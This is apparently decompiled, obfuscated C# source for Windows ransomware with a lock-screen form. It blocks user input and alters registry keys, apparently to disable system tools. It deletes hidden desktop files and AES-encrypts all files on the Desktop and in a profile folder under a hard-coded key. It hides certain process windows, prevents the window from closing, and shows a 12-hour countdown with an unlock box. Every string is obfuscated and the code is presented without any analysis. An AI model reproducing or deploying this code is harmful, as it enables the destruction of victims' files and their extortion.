using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns1;

public class GForm0 : Form
{
	public class GClass0
	{
		public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class GClass1
	{
		public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class GClass2
	{
		public void method_0(string string_0, string string_1)
		{
			byte[] byte_ = File.ReadAllBytes(string_0);
			byte[] bytes = Encoding.UTF8.GetBytes(string_1);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = GClass0.smethod_0(byte_, bytes);
			File.WriteAllBytes(string_0, bytes2);
		}
	}

	public class GClass3
	{
		public void method_0(string string_0, string string_1)
		{
			byte[] byte_ = File.ReadAllBytes(string_0);
			byte[] bytes = Encoding.UTF8.GetBytes(string_1);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = GClass1.smethod_0(byte_, bytes);
			File.WriteAllBytes(string_0, bytes2);
		}
	}

	[CompilerGenerated]
	private sealed class Class2
	{
		public GForm0 gform0_0;

		public DateTime dateTime_0;

		internal void method_0(object sender, EventArgs e)
		{
			((Control)gform0_0.label_2).set_Text((TimeSpan.FromHours(12.0) - (DateTime.Now - dateTime_0)).ToString(GClass4.smethod_0("bšɔ\u033dѫը\u0658\u0739\u0871ॲ")));
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class3
	{
		public static readonly Class3 class3_0 = new Class3();

		public static Func<string, bool> func_0;

		internal bool method_0(string string_0)
		{
			return (new FileInfo(string_0).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden;
		}
	}

	private const int int_0 = 0;

	private const int int_1 = 5;

	private IContainer icontainer_0 = null;

	private PictureBox pictureBox_0;

	private PictureBox pictureBox_1;

	private Label label_0;

	private Label label_1;

	private TextBox textBox_0;

	private Button button_0;

	private Label label_2;

	private Label label_3;

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	private Timer timer_4;

	[DllImport("User32")]
	private static extern int ShowWindow(int int_2, int int_3);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool bool_0);

	public GForm0()
	{
		method_0();
		((Control)label_2).set_Text(TimeSpan.FromHours(12.0).ToString());
	}

	private void GForm0_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Expected O, but got Unknown
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		smethod_0();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(GClass4.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"));
		registryKey.SetValue(GClass4.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(GClass4.smethod_0("VŻɽ\u0366ѣտ٣ܮ\u085d७\u0a65୯\u0c65ൔใལၶᅯቷ፭ᑱ"));
		registryKey2.SetValue(GClass4.smethod_0("^ũɫ\u036aѵեٳݧ\u0873"), GClass4.smethod_0(""), RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey(GClass4.smethod_0("fŻɵ\u0366Ѧձٽݫ\u0871ॡ\u0a42\u0b49\u0c5b\u0d47๔ཉ၃ᅐቿ፵ᑈᕎᙻ\u1771ᡪ\u196fᨻ᭔ᱍᵄṔὣ\u2067Ⅶ≶⍼⑥╆♪❼⡾⥥⩤⭤ⱕⵟ\u2e6e⽨どㅫ㉤㍭㑯"));
		registryKey3.SetValue(GClass4.smethod_0("VŬɦ\u036eѭ"), GClass4.smethod_0("`ũɳͶѸ"), RegistryValueKind.String);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from string_0 in Directory.EnumerateFiles(folderPath + GClass4.smethod_0("]"))
			where (new FileInfo(string_0).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select string_0).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		DateTime dateTime_0 = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label_2).set_Text((TimeSpan.FromHours(12.0) - (DateTime.Now - dateTime_0)).ToString(GClass4.smethod_0("bšɔ\u033dѫը\u0658\u0739\u0871ॲ")));
		});
		val2.set_Enabled(true);
		timer_0.Start();
		timer_1.Start();
		timer_2.Start();
		timer_3.Start();
		timer_4.Start();
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		timer_0.Stop();
		((Form)this).set_Opacity(100.0);
		((Form)this).set_Size(new Size(701, 584));
		((Form)this).set_Location(new Point(500, 500));
		smethod_1();
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		timer_1.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + GClass4.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable(GClass4.smethod_0("^řɌ\u035aїՔي\u0742ࡊ\u094e\u0a44"));
		string text = Path.Combine(environmentVariable, GClass4.smethod_0("Mŧɰ\u0368ѩի٢ݦ\u0872"));
		string path2 = text + GClass4.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		File.Delete(path2);
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		timer_2.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == GClass4.smethod_0("`ůɥ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass4.smethod_0("uţɢ\u0361ѧիٵ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass4.smethod_0("]žɤ\u0369Ѭջٴݮࡤ१੨୧\u0c73"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass4.smethod_0("vŠɠ\u036eѵ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
		}
		timer_2.Start();
	}

	private void timer_3_Tick(object sender, EventArgs e)
	{
		timer_3.Stop();
		smethod_2();
	}

	private void timer_4_Tick(object sender, EventArgs e)
	{
		timer_4.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName(GClass4.smethod_0("_ŭɥ\u0379Ѧե\u0670ݧ\u0877ॡ\u0a31ବఱ"));
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			Process.Start(GClass4.smethod_0("{ůɳͱѠլٵݯ"), GClass4.smethod_0("(Ŵȥ\u032bѷԢر"));
			process.Kill();
		}
		((Form)this).Close();
	}

	private void button_0_Click(object sender, EventArgs e)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox_0).get_Text() == GClass4.smethod_0(""))
		{
			MessageBox.Show(GClass4.smethod_0("DŢɨ\u0365ѻպ٢ݥ\u0871त੨୧౸"), GClass4.smethod_0("^ŚɈ\u0348тԤو\u0747ࡘ"), (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox_0).get_Text() == GClass4.smethod_0("R\u0530ـ\u073f\u00b4ƶˇό\u08dcফહ\u0bbc\u0cd4ඞຎ྿ႪᆋዒᎶᒨᗅዞᎬ\u1cdb\u1dd7Ẫΐᢨᦦ\u1ad8ᯚ⒢■⚭➣\u209f⇠⋯⏩⳦ⶖ⫼⮰Ⳡⶪ⫪⮔㓦㗦㛤㟫や㗯㚦㟫㳶㷿㺋㮙㳭㷰㻹㮇䒂䖉䛼䟾䂍䆆䋿䎉䲀䷶䫤䮟䢃䦃䫽䮌哷嗲嚁埲傑凮嚉埬壊姒嫊寤峠嶑廩忿惧憜拀描撦旚曃柹棫槴櫱殬泏淸滮殧璨痜皢瞫炱燍皩矾磏秓竧箠粰緊继翃胒膳苠菇营蔶蘳蜸蠶褃訪謻豆货踻輳逡酄鈼錧鐛锝阢霴頺餐騗鬫鱄鵅鸞鼠ꀊꄳꉊꌄꐀꅭꉣꍧ걥굨깩꽢ꡯꥧꩠꬔ둮땧똓띨끵녾뙥뜋렬뤉멬뭿뱡뵪븈뽯쑾앷왰윀쀊섈숀썷찂쥆쩡쬄찆쵬칲켁큻텼툃팖푨핗혂흘\ud856\ud903\uda7d\udb75\udc65\udd13\ude16\udf79\ue06f\ue15e\ue250\ue35c\ue42f\ue52d\ue67c\ue771\ue834\ue97f\uea25\ueb40\uec2c\ued47\uee5e\uef7a\uf039\uf151\uf230\uf37d\uf441\uf57f\uf663\uf75f\uf83d陋祉\ufb42ﱎﵧ︷ｖrśɦ"))
		{
			MessageBox.Show(GClass4.smethod_0("FŹɵ\u032fѥըٵܫࡣॺਨ\u0b64౩൷\u0e76སၡᅵ"), GClass4.smethod_0("]ŉɊ\u034aчՈه\u0745"), (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(GClass4.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"));
			registryKey.SetValue(GClass4.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), GClass4.smethod_0(""), RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey(GClass4.smethod_0("fŻɵ\u0366Ѧձٽݫ\u0871ॡ\u0a42\u0b49\u0c5b\u0d47๔ཉ၃ᅐቿ፵ᑈᕎᙻ\u1771ᡪ\u196fᨻ᭔ᱍᵄṔὣ\u2067Ⅶ≶⍼⑥╆♪❼⡾⥥⩤⭤ⱕⵟ\u2e6e⽨どㅫ㉤㍭㑯"));
			registryKey2.SetValue(GClass4.smethod_0("VŬɦ\u036eѭ"), GClass4.smethod_0("iųɺ\u0365ѧյ٣ݷ\u082a०\u0a7a\u0b64"), RegistryValueKind.String);
			smethod_3();
			Process[] array = null;
			array = Process.GetProcessesByName(GClass4.smethod_0("^Ūɹ\u0366ѥհ٧ݷࡡऱਬ\u0b31"));
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show(GClass4.smethod_0("DŢɨ\u0365ѻպ٢ݥ\u0871त੨୧౸"), GClass4.smethod_0("^ŚɈ\u0348тԤو\u0747ࡘ"), (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public static void smethod_0()
	{
		BlockInput(bool_0: true);
	}

	public static void smethod_1()
	{
		BlockInput(bool_0: false);
	}

	private void textBox_0_TextChanged(object sender, EventArgs e)
	{
	}

	private static void smethod_2()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable(GClass4.smethod_0("^řɌ\u035aїՔي\u0742ࡊ\u094e\u0a44"));
		string text = Path.Combine(environmentVariable, GClass4.smethod_0("Mŧɰ\u0368ѩի٢ݦ\u0872"));
		string[] files = Directory.GetFiles(folderPath + GClass4.smethod_0("]"), GClass4.smethod_0("+"), SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + GClass4.smethod_0("]"), GClass4.smethod_0("+"), SearchOption.AllDirectories);
		GClass2 gClass = new GClass2();
		string string_ = GClass4.smethod_0("R\u0530ـ\u073f\u00b4ƶˇό\u08dcফહ\u0bbc\u0cd4ඞຎ྿ႪᆋዒᎶᒨᗅዞᎬ\u1cdb\u1dd7Ẫΐᢨᦦ\u1ad8ᯚ⒢■⚭➣\u209f⇠⋯⏩⳦ⶖ⫼⮰Ⳡⶪ⫪⮔㓦㗦㛤㟫や㗯㚦㟫㳶㷿㺋㮙㳭㷰㻹㮇䒂䖉䛼䟾䂍䆆䋿䎉䲀䷶䫤䮟䢃䦃䫽䮌哷嗲嚁埲傑凮嚉埬壊姒嫊寤峠嶑廩忿惧憜拀描撦旚曃柹棫槴櫱殬泏淸滮殧璨痜皢瞫炱燍皩矾磏秓竧箠粰緊继翃胒膳苠菇营蔶蘳蜸蠶褃訪謻豆货踻輳逡酄鈼錧鐛锝阢霴頺餐騗鬫鱄鵅鸞鼠ꀊꄳꉊꌄꐀꅭꉣꍧ걥굨깩꽢ꡯꥧꩠꬔ둮땧똓띨끵녾뙥뜋렬뤉멬뭿뱡뵪븈뽯쑾앷왰윀쀊섈숀썷찂쥆쩡쬄찆쵬칲켁큻텼툃팖푨핗혂흘\ud856\ud903\uda7d\udb75\udc65\udd13\ude16\udf79\ue06f\ue15e\ue250\ue35c\ue42f\ue52d\ue67c\ue771\ue834\ue97f\uea25\ueb40\uec2c\ued47\uee5e\uef7a\uf039\uf151\uf230\uf37d\uf441\uf57f\uf663\uf75f\uf83d陋祉\ufb42ﱎﵧ︷ｖrśɦ");
		for (int i = 0; i < files.Length; i++)
		{
			gClass.method_0(files[i], string_);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			gClass.method_0(files2[j], string_);
		}
	}

	private static void smethod_3()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable(GClass4.smethod_0("^řɌ\u035aїՔي\u0742ࡊ\u094e\u0a44"));
		string text = Path.Combine(environmentVariable, GClass4.smethod_0("Mŧɰ\u0368ѩի٢ݦ\u0872"));
		string[] files = Directory.GetFiles(folderPath + GClass4.smethod_0("]"), GClass4.smethod_0("+"), SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + GClass4.smethod_0("]"), GClass4.smethod_0("+"), SearchOption.AllDirectories);
		GClass3 gClass = new GClass3();
		string string_ = GClass4.smethod_0("R\u0530ـ\u073f\u00b4ƶˇό\u08dcফહ\u0bbc\u0cd4ඞຎ྿ႪᆋዒᎶᒨᗅዞᎬ\u1cdb\u1dd7Ẫΐᢨᦦ\u1ad8ᯚ⒢■⚭➣\u209f⇠⋯⏩⳦ⶖ⫼⮰Ⳡⶪ⫪⮔㓦㗦㛤㟫や㗯㚦㟫㳶㷿㺋㮙㳭㷰㻹㮇䒂䖉䛼䟾䂍䆆䋿䎉䲀䷶䫤䮟䢃䦃䫽䮌哷嗲嚁埲傑凮嚉埬壊姒嫊寤峠嶑廩忿惧憜拀描撦旚曃柹棫槴櫱殬泏淸滮殧璨痜皢瞫炱燍皩矾磏秓竧箠粰緊继翃胒膳苠菇营蔶蘳蜸蠶褃訪謻豆货踻輳逡酄鈼錧鐛锝阢霴頺餐騗鬫鱄鵅鸞鼠ꀊꄳꉊꌄꐀꅭꉣꍧ걥굨깩꽢ꡯꥧꩠꬔ둮땧똓띨끵녾뙥뜋렬뤉멬뭿뱡뵪븈뽯쑾앷왰윀쀊섈숀썷찂쥆쩡쬄찆쵬칲켁큻텼툃팖푨핗혂흘\ud856\ud903\uda7d\udb75\udc65\udd13\ude16\udf79\ue06f\ue15e\ue250\ue35c\ue42f\ue52d\ue67c\ue771\ue834\ue97f\uea25\ueb40\uec2c\ued47\uee5e\uef7a\uf039\uf151\uf230\uf37d\uf441\uf57f\uf663\uf75f\uf83d陋祉\ufb42ﱎﵧ︷ｖrśɦ");
		for (int i = 0; i < files.Length; i++)
		{
			gClass.method_0(files[i], string_);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			gClass.method_0(files2[j], string_);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_0()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Expected O, but got Unknown
		//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e6: Expected O, but got Unknown
		//IL_0395: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Expected O, but got Unknown
		//IL_044c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0456: Expected O, but got Unknown
		//IL_0528: Unknown result type (might be due to invalid IL or missing references)
		//IL_0532: Expected O, but got Unknown
		//IL_05de: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e8: Expected O, but got Unknown
		//IL_0845: Unknown result type (might be due to invalid IL or missing references)
		//IL_084f: Expected O, but got Unknown
		//IL_089a: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a4: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm0));
		pictureBox_0 = new PictureBox();
		pictureBox_1 = new PictureBox();
		label_0 = new Label();
		label_1 = new Label();
		textBox_0 = new TextBox();
		button_0 = new Button();
		label_2 = new Label();
		label_3 = new Label();
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		timer_2 = new Timer(icontainer_0);
		timer_3 = new Timer(icontainer_0);
		timer_4 = new Timer(icontainer_0);
		((ISupportInitialize)pictureBox_0).BeginInit();
		((ISupportInitialize)pictureBox_1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pictureBox_0).set_Cursor(Cursors.get_No());
		pictureBox_0.set_Image((Image)componentResourceManager.GetObject(GClass4.smethod_0("aŹɬͺѸվٮ\u0748ࡦ॰ਸ਼ନ\u0c4c൩\u0e62ཥ\u1064")));
		((Control)pictureBox_0).set_Location(new Point(0, 392));
		((Control)pictureBox_0).set_Name(GClass4.smethod_0("{ţɪͼѲմ٠\u0746\u086cॺਰ"));
		((Control)pictureBox_0).set_Size(new Size(143, 155));
		pictureBox_0.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox_0.set_TabIndex(0);
		pictureBox_0.set_TabStop(false);
		((Control)pictureBox_1).set_Cursor(Cursors.get_No());
		pictureBox_1.set_Image((Image)componentResourceManager.GetObject(GClass4.smethod_0("aŹɬͺѸվٮ\u0748ࡦ॰ਵନ\u0c4c൩\u0e62ཥ\u1064")));
		((Control)pictureBox_1).set_Location(new Point(548, 391));
		((Control)pictureBox_1).set_Name(GClass4.smethod_0("{ţɪͼѲմ٠\u0746\u086cॺਲ਼"));
		((Control)pictureBox_1).set_Size(new Size(138, 156));
		pictureBox_1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox_1.set_TabIndex(1);
		pictureBox_1.set_TabStop(false);
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_Font(new Font(GClass4.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label_0).set_ForeColor(Color.White);
		((Control)label_0).set_Location(new Point(13, 13));
		((Control)label_0).set_Name(GClass4.smethod_0("hšɮ\u0330"));
		((Control)label_0).set_Size(new Size(0, 25));
		((Control)label_0).set_TabIndex(2);
		((Control)label_1).set_AutoSize(true);
		((Control)label_1).set_Cursor(Cursors.get_Help());
		((Control)label_1).set_Font(new Font(GClass4.smethod_0("_Ÿɳͽѡվ٣ݭ\u087eऩ\u0a51୦\u0c4eൠ\u0e6d༣\u1057ᅈ"), 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)238));
		((Control)label_1).set_ForeColor(Color.White);
		((Control)label_1).set_Location(new Point(12, 9));
		((Control)label_1).set_Name(GClass4.smethod_0("jŤɦ\u0366Ѯ\u0530"));
		((Control)label_1).set_Size(new Size(652, 364));
		((Control)label_1).set_TabIndex(3);
		((Control)label_1).set_Text(componentResourceManager.GetString(GClass4.smethod_0("gūɫ\u036dѫԷثݐࡦॺ\u0a75")));
		label_1.set_TextAlign((ContentAlignment)32);
		((Control)textBox_0).set_BackColor(Color.Gray);
		((Control)textBox_0).set_Font(new Font(GClass4.smethod_0("_Ÿɳͽѡվ٣ݭ\u087eऩ\u0a51୦\u0c4eൠ\u0e6d༣\u1057ᅈ"), 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)textBox_0).set_Location(new Point(144, 392));
		((Control)textBox_0).set_Name(GClass4.smethod_0("dũɡ\u0361ѡխٹ"));
		((Control)textBox_0).set_Size(new Size(398, 34));
		((Control)textBox_0).set_TabIndex(5);
		textBox_0.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox_0).add_TextChanged((EventHandler)textBox_0_TextChanged);
		((Control)button_0).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button_0).set_FlatStyle((FlatStyle)1);
		((Control)button_0).set_Font(new Font(GClass4.smethod_0("_Ÿɳͽѡվ٣ݭ\u087eऩ\u0a51୦\u0c4eൠ\u0e6d༣\u1057ᅈ"), 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)238));
		((Control)button_0).set_ForeColor(Color.White);
		((Control)button_0).set_Location(new Point(144, 429));
		((Control)button_0).set_Name(GClass4.smethod_0("eųɱͰѬլذ"));
		((Control)button_0).set_Size(new Size(398, 53));
		((Control)button_0).set_TabIndex(6);
		((Control)button_0).set_Text(GClass4.smethod_0("IŉɈ\u0358ѐ\u0558\u0653ܦࡃ\u094d\u0a4f\u0b47\u0c52"));
		((ButtonBase)button_0).set_UseVisualStyleBackColor(true);
		((Control)button_0).add_Click((EventHandler)button_0_Click);
		((Control)label_2).set_AutoSize(true);
		((Control)label_2).set_Cursor(Cursors.get_No());
		((Control)label_2).set_Font(new Font(GClass4.smethod_0("_Ÿɳͽѡվ٣ݭ\u087eऩ\u0a51୦\u0c4eൠ\u0e6d༣\u1057ᅈ"), 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)238));
		((Control)label_2).set_ForeColor(Color.White);
		((Control)label_2).set_Location(new Point(431, 492));
		((Control)label_2).set_Name(GClass4.smethod_0("jŤɦ\u0366ѮԳ"));
		((Control)label_2).set_Size(new Size(102, 28));
		((Control)label_2).set_TabIndex(7);
		((Control)label_2).set_Text(GClass4.smethod_0("8ķȼ\u0335дԹز\u0731"));
		((Control)label_3).set_AutoSize(true);
		((Control)label_3).set_Cursor(Cursors.get_No());
		((Control)label_3).set_Font(new Font(GClass4.smethod_0("_Ÿɳͽѡվ٣ݭ\u087eऩ\u0a51୦\u0c4eൠ\u0e6d༣\u1057ᅈ"), 24f, (FontStyle)3, (GraphicsUnit)3, (byte)238));
		((Control)label_3).set_ForeColor(Color.White);
		((Control)label_3).set_Location(new Point(144, 485));
		((Control)label_3).set_Name(GClass4.smethod_0("jŤɦ\u0366ѮԲ"));
		((Control)label_3).set_Size(new Size(278, 42));
		((Control)label_3).set_TabIndex(8);
		((Control)label_3).set_Text(GClass4.smethod_0("_ŉɊ\u0347рՆـܦࡑ\u094d\u0a4e\u0b47\u0c3b"));
		timer_0.set_Enabled(true);
		timer_0.set_Interval(10000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_1.set_Enabled(true);
		timer_1.set_Interval(1000);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		timer_2.set_Enabled(true);
		timer_2.set_Interval(300);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		timer_3.set_Enabled(true);
		timer_3.set_Interval(1000);
		timer_3.add_Tick((EventHandler)timer_3_Tick);
		timer_4.set_Enabled(true);
		timer_4.set_Interval(43200000);
		timer_4.add_Tick((EventHandler)timer_4_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(685, 546));
		((Control)this).get_Controls().Add((Control)(object)label_3);
		((Control)this).get_Controls().Add((Control)(object)label_2);
		((Control)this).get_Controls().Add((Control)(object)button_0);
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).get_Controls().Add((Control)(object)pictureBox_1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox_0);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject(GClass4.smethod_0(".Žɠ\u036eѵԫ\u064dݠ\u086d९")));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(GClass4.smethod_0("YūɧͻѨիٲݥ\u0871१ਲ਼"));
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text(GClass4.smethod_0("_ŭɥ\u0379Ѧե\u0670ݧ\u0877ॡ\u0a31ବఱ"));
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(GForm0_FormClosing));
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((ISupportInitialize)pictureBox_0).EndInit();
		((ISupportInitialize)pictureBox_1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
